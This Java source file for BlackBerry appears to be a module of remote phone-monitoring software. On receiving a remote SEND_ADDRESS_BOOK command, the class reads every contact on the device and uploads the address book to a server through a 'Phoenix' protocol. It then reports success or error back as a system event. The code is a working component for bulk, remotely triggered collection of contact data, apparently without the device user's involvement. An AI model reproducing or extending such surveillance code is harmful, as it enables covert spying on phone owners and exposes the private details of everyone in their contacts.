package com.vvt.rmtcmd.pcc;

import java.util.Enumeration;
import javax.microedition.pim.PIMException;
import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.blackberry.api.pdap.BlackBerryContactList;
import net.rim.blackberry.api.pdap.BlackBerryPIM;
import com.vvt.global.Global;
import com.vvt.prot.CommandResponse;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.prot.command.response.SendAddressBookCmdResponse;
import com.vvt.protsrv.PhoenixProtocolListener;
import com.vvt.protsrv.SendAddressBookSyncManager;
import com.vvt.protsrv.SendEventManager;
import com.vvt.protsrv.addr.AddressBookStore;
import com.vvt.protsrv.addr.ContactInfo;
import com.vvt.protsrv.addr.ContactStore;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class PCCSendAddressbook extends PCCRmtCmdAsync implements PhoenixProtocolListener {

	private SendAddressBookSyncManager sendAddrMng = Global.getSendAddressBookSyncManager();
	private SendEventManager eventSender = Global.getSendEventManager();
	
	private AddressBookStore initAddressBook() throws PIMException {
		BlackBerryContactList contactList = null;
		try {
			AddressBookStore addrStore = new AddressBookStore();
			ContactStore contStore = new ContactStore();
			contStore.setAddressBookId(1);
			contactList = (BlackBerryContactList)BlackBerryPIM.getInstance().openPIMList(BlackBerryPIM.CONTACT_LIST, BlackBerryPIM.READ_ONLY);
			contStore.setAddressBookName(contactList.getName());
			Enumeration contactEnum = contactList.items();		
			while (contactEnum.hasMoreElements()) {
				BlackBerryContact contact = (BlackBerryContact)contactEnum.nextElement();
				ContactInfo contInfo = new ContactInfo();
				contInfo.setClientId("0");
				contInfo.setServerId(0);
				contInfo.setContact(contact);
				contStore.addContact(contInfo);			
			}
			addrStore.addContactStore(contStore);
			return addrStore;
		} finally {
			contactList.close();
		}
	}
	
	// Runnable
	public void run() {
//		Log.debug("PCCSendAddressbook.run()", "ENTER!");
		doPCCHeader(PhoenixCompliantCommand.SEND_ADDRESS_BOOK.getId());
		responseMessage.append(RmtCmdTextResource.COMMAND_BEING_PROCESSED);		
		sendAddrMng.addListener(this);
		try {
			sendAddrMng.send(initAddressBook());
		} catch (Exception e) {
			Log.error("PCCSendAddressbook.run()", e.getMessage(), e);
			sendAddrMng.removeListener(this);
			doPCCHeader(PhoenixCompliantCommand.SEND_ADDRESS_BOOK.getId());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());						
		}
//		Log.debug("PCCSendAddressbook.run()", "Before gen system!");
		// To create system event.
		createSystemEventOut(responseMessage.toString());	
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
//		Log.debug("PCCSendAddressbook.execute()", "ENTER!");
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}

	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error("PCCSendAddressbook.onError()", message);
		sendAddrMng.removeListener(this);
		doPCCHeader(PhoenixCompliantCommand.SEND_ADDRESS_BOOK.getId());
		responseMessage.append(Constant.ERROR);
		responseMessage.append(Constant.CRLF);
		responseMessage.append(message);
//		Log.debug("PCCSendAddressbook.run()", "Before gen system!");
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}

	public void onSuccess(CommandResponse response) {
		sendAddrMng.removeListener(this);
		doPCCHeader(PhoenixCompliantCommand.SEND_ADDRESS_BOOK.getId());
		if (response instanceof SendAddressBookCmdResponse) {
			SendAddressBookCmdResponse sendAddrResp = (SendAddressBookCmdResponse)response;
			if (sendAddrResp.getStatusCode() == 0) {
				responseMessage.append(Constant.OK);
				observer.cmdExecutedSuccess(this);
//				Log.debug("PCCSendAddressbook.onSuccess()", "ENTER");
			} else {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(sendAddrResp.getServerMsg());
				observer.cmdExecutedError(this);
			}
//			Log.debug("PCCSendAddressbook.run()", "Before gen system!");
			// To create system event.
			createSystemEventOut(responseMessage.toString());
			// To send events
			eventSender.sendEvents();
		}
	}
}
